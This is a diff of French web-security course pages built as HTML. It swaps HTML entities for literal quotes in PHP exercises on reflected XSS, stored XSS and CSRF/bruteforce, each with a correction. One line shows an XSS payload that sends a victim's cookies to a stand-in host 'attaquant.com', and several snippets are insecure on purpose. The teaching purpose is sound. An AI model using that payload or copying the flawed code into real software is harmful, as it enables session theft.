-    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
-    <span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO users (name, email) VALUES (&#39;?&#39;, &#39;?&#39;)&quot;</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">];</span>
+    <span class="nv">$request</span> <span class="o">=</span> <span class="s2">"INSERT INTO users (name, email) VALUES ('?', '?')"</span><span class="p">;</span>
     <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$email</span><span class="p">]);</span>
 <span class="p">}</span>
 
@@ -7530,8 +7530,8 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 - `FILTER_SANITIZE_EMAIL` : Supprime les caractères illégaux dans un email.
 - `FILTER_SANITIZE_URL` : Supprime les caractères illégaux dans une URL.
 - `FILTER_SANITIZE_NUMBER_INT` : Supprime tous les caractères sauf les chiffres et le signe + et -.
-- Exemple : `filter_input(INPUT_POST, &#39;name&#39;, FILTER_SANITIZE_STRING);`
-- Exemple : `filter_input(INPUT_POST, &#39;email&#39;, FILTER_SANITIZE_EMAIL);`
+- Exemple : `filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);`
+- Exemple : `filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);`
 - Voir plus de filtres : [https://www.php.net/manual/fr/filter.filters.sanitize.php](https://www.php.net/manual/fr/filter.filters.sanitize.php)
 </code></pre></div>
 <details class="question">
@@ -7541,17 +7541,17 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>De plus, les entrées utilisateur ne sont pas assainies (risque XSS à la réaffichage).</p>
 <p><strong>Correction</strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="c1">// Assainir les entrées</span>
-    <span class="nv">$name</span>  <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]),</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">);</span>
-    <span class="nv">$email</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">);</span>
+    <span class="nv">$name</span>  <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
+    <span class="nv">$email</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">);</span>
 
     <span class="k">if</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Email invalide&#39;</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s1">'Email invalide'</span><span class="p">);</span>
     <span class="p">}</span>
 
     <span class="c1">// Le placeholder ? ne doit PAS être entouré de guillemets</span>
-    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;INSERT INTO users (name, email) VALUES (?, ?)&quot;</span><span class="p">);</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO users (name, email) VALUES (?, ?)"</span><span class="p">);</span>
     <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$email</span><span class="p">]);</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
@@ -7562,7 +7562,7 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>Identifiez les failles de sécurité dans le code source suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;Bonjour </span><span class="si">$_GET[&#39;name&#39;]</span><span class="s2">&lt;/h2&gt;&quot;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;h2&gt;Bonjour </span><span class="si">$_GET['name']</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
 
 <span class="cp">?&gt;</span>
 </code></pre></div>
@@ -7574,7 +7574,7 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <ol>
 <li>
 <p><strong>XSS réfléchie</strong> : <code>$_GET['name']</code> est affiché directement dans la page sans aucun échappement. Un attaquant peut forger l'URL :
-   <div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>?name=&lt;script&gt;document.location=&#39;http://attaquant.com/?c=&#39;+document.cookie&lt;/script&gt;
+   <div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>?name=&lt;script&gt;document.location='http://attaquant.com/?c='+document.cookie&lt;/script&gt;
 </code></pre></div>
    Le script est exécuté dans le navigateur de la victime et peut voler ses cookies de session.</p>
 </li>
@@ -7592,13 +7592,13 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p><strong>Correction</strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="c1">// Échapper la valeur avant tout affichage</span>
-<span class="nv">$name</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">);</span>
-<span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;Bonjour </span><span class="si">$name</span><span class="s2">&lt;/h2&gt;&quot;</span><span class="p">;</span>
+<span class="nv">$name</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"&lt;h2&gt;Bonjour </span><span class="si">$name</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
 <span class="cp">?&gt;</span>
 </code></pre></div>
 <p><strong>Bonus :</strong> valider que le nom ne contient que des caractères attendus :
-<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">$name = preg_replace(&#39;/[^a-zA-ZÀ-ÿ\s\-]/&#39;, &#39;&#39;, $_GET[&#39;name&#39;] ?? &#39;&#39;);</span>
-<span class="x">$name = htmlspecialchars($name, ENT_QUOTES, &#39;UTF-8&#39;);</span>
+<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">$name = preg_replace('/[^a-zA-ZÀ-ÿ\s\-]/', '', $_GET['name'] ?? '');</span>
+<span class="x">$name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');</span>
 </code></pre></div></p>
 </details>
 <h2 id="faille-10">Faille 10<a class="headerlink" href="#faille-10" title="Permanent link">⚓︎</a></h2>
@@ -7607,35 +7607,35 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>Page affichant les commentaires :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="c1">// Récupère les commentaires</span>
-<span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM comments&quot;</span><span class="p">;</span>
+<span class="nv">$request</span> <span class="o">=</span> <span class="s2">"SELECT * FROM comments"</span><span class="p">;</span>
 <span class="nv">$comments</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 
-<span class="c1">// Ajout d&#39;un commentaire</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
-    <span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO comments (content) VALUES (?)&quot;</span><span class="p">;</span>
+<span class="c1">// Ajout d'un commentaire</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">];</span>
+    <span class="nv">$request</span> <span class="o">=</span> <span class="s2">"INSERT INTO comments (content) VALUES (?)"</span><span class="p">;</span>
     <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$content</span><span class="p">]);</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
 
-<span class="x">&lt;div class=&quot;container&quot;&gt;</span>
+<span class="x">&lt;div class="container"&gt;</span>
 <span class="x">    &lt;h1&gt;Exercice 10&lt;/h1&gt;</span>
 <span class="x">    &lt;p&gt;Vous devez corriger la faille XSS Stockée&lt;/p&gt;</span>
 <span class="x">    &lt;p&gt;Voici les commentaires :&lt;/p&gt;</span>
 <span class="x">    &lt;ul&gt;</span>
 <span class="x">        </span><span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$comments</span> <span class="k">as</span> <span class="nv">$comment</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
-<span class="x">            &lt;li&gt;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$comment</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
+<span class="x">            &lt;li&gt;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$comment</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
 <span class="x">        </span><span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
 <span class="x">    &lt;/ul&gt;</span>
 <span class="x">&lt;/div&gt;</span>
 
-<span class="x">&lt;!-- Ajout d&#39;un commentaire --&gt;</span>
+<span class="x">&lt;!-- Ajout d'un commentaire --&gt;</span>
 <span class="x">&lt;form&gt;</span>
-<span class="x">    &lt;div class=&quot;form-group&quot;&gt;</span>
-<span class="x">        &lt;label for=&quot;content&quot;&gt;Commentaire&lt;/label&gt;</span>
-<span class="x">        &lt;textarea class=&quot;form-control&quot; id=&quot;content&quot; name=&quot;content&quot; rows=&quot;3&quot;&gt;&lt;/textarea&gt;</span>
+<span class="x">    &lt;div class="form-group"&gt;</span>
+<span class="x">        &lt;label for="content"&gt;Commentaire&lt;/label&gt;</span>
+<span class="x">        &lt;textarea class="form-control" id="content" name="content" rows="3"&gt;&lt;/textarea&gt;</span>
 <span class="x">    &lt;/div&gt;</span>
-<span class="x">    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Envoyer&lt;/button&gt;</span>
+<span class="x">    &lt;button type="submit" class="btn btn-primary"&gt;Envoyer&lt;/button&gt;</span>
 <span class="x">&lt;/form&gt;</span>
 </code></pre></div>
 <p>Proposez une solution pour corriger cette faille. Deux solutions sont possibles.</p>
@@ -7667,15 +7667,15 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p><strong>Solution 1 : échapper à l'affichage (recommandée)</strong></p>
 <p>Ne pas modifier ce qui est stocké en base ; échapper au moment de l'affichage :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$comments</span> <span class="k">as</span> <span class="nv">$comment</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
-<span class="x">    &lt;li&gt;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$comment</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
+<span class="x">    &lt;li&gt;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$comment</span><span class="p">[</span><span class="s1">'content'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
 <span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
 </code></pre></div>
 <p><strong>Solution 2 : assainir à l'insertion</strong></p>
 <p>Nettoyer le contenu avant de le stocker en base :</p>
-<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">if (isset($_POST[&#39;content&#39;])) {</span>
-<span class="x">    $content = htmlspecialchars(trim($_POST[&#39;content&#39;]), ENT_QUOTES, &#39;UTF-8&#39;);</span>
-<span class="x">    // ou : $content = strip_tags($_POST[&#39;content&#39;]);</span>
-<span class="x">    $stmt = $pdo-&gt;prepare(&quot;INSERT INTO comments (content) VALUES (?)&quot;);</span>
+<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">if (isset($_POST['content'])) {</span>
+<span class="x">    $content = htmlspecialchars(trim($_POST['content']), ENT_QUOTES, 'UTF-8');</span>
+<span class="x">    // ou : $content = strip_tags($_POST['content']);</span>
+<span class="x">    $stmt = $pdo-&gt;prepare("INSERT INTO comments (content) VALUES (?)");</span>
 <span class="x">    $stmt-&gt;execute([$content]);</span>
 <span class="x">}</span>
 </code></pre></div>
@@ -7687,24 +7687,24 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <h2 id="faille-11">Faille 11<a class="headerlink" href="#faille-11" title="Permanent link">⚓︎</a></h2>
 <p>L'auditeur a trouvé dans votre code une faille de type Bruteforce / CSRF. Avec cette faille il est capable de rejouer une requête à l'infini sans aucune limite, il peut s'en servir pour bruteforcer un mot de passe par exemple.</p>
 <p>Soit l'extrait de code suivant :</p>
-<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="cm">&lt;!-- Formulaire d&#39;authentification --&gt;</span>
-<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/login&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Username&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Password&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span><span class="p">&gt;</span>
+<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="cm">&lt;!-- Formulaire d'authentification --&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"/login"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"Username"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"password"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"Password"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Login"</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </code></pre></div>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
-<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
 
 <span class="c1">// Vérification du mot de passe</span>
-<span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE username = ?&quot;</span><span class="p">;</span>
+<span class="nv">$request</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username = ?"</span><span class="p">;</span>
 <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$username</span><span class="p">]);</span>
 <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nb">password_verify</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nb">password_verify</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="c1">// Connexion réussie</span>
     <span class="c1">// …</span>
 <span class="p">}</span>
@@ -7714,19 +7714,19 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p class="admonition-title">Protection CSRF / Token</p>
 <p>Pour protéger votre application contre les attaques CSRF, vous devez ajouter un token CSRF dans le formulaire. Ce token doit être généré aléatoirement et doit être vérifié lors de l'accès à la page.</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">// Vérifier le token</span>
-<span class="x">if (isset($_POST[&#39;token&#39;]) &amp;&amp; $_POST[&#39;token&#39;] === $_SESSION[&#39;token&#39;]) {</span>
+<span class="x">if (isset($_POST['token']) &amp;&amp; $_POST['token'] === $_SESSION['token']) {</span>
 <span class="x">    // Nous avons consommé le token, nous pouvons le supprimer</span>
-<span class="x">    unset($_SESSION[&#39;token&#39;]);</span>
+<span class="x">    unset($_SESSION['token']);</span>
 
 <span class="x">    // Le token est valide, nous pouvons traiter la requête</span>
 <span class="x">    // ...</span>
 <span class="x">}</span>
 
 <span class="x">// Génère un token aléatoire</span>
-<span class="x">$_SESSION[&#39;token&#39;] = uniqid();</span>
+<span class="x">$_SESSION['token'] = uniqid();</span>
 </code></pre></div>
 <p>Et dans le formulaire :</p>
-<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;token&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&lt;?= $_SESSION[&#39;token&#39;] ?&gt;&quot;</span><span class="p">&gt;</span>
+<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"token"</span> <span class="na">value</span><span class="o">=</span><span class="s">"&lt;?= $_SESSION['token'] ?&gt;"</span><span class="p">&gt;</span>
 </code></pre></div>
 </div>
 <p>Proposez une solution pour corriger cette faille.</p>
@@ -7749,46 +7749,46 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <span class="nb">session_start</span><span class="p">();</span>
 
 <span class="c1">// Initialisation du compteur et du token</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]))</span>  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]))</span>       <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]))</span>  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]))</span>       <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'POST'</span><span class="p">)</span> <span class="p">{</span>
 
     <span class="c1">// 1. Vérification du token CSRF</span>
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">hash_equals</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Token CSRF invalide&#39;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'token'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">hash_equals</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s1">'Token CSRF invalide'</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="c1">// Invalider le token (usage unique) et en générer un nouveau</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
 
     <span class="c1">// 2. Limitation des tentatives</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Trop de tentatives. Réessayez plus tard.&#39;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s1">'Trop de tentatives. Réessayez plus tard.'</span><span class="p">);</span>
     <span class="p">}</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
 
     <span class="c1">// 3. Délai anti-brute-force</span>
     <span class="nb">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
 
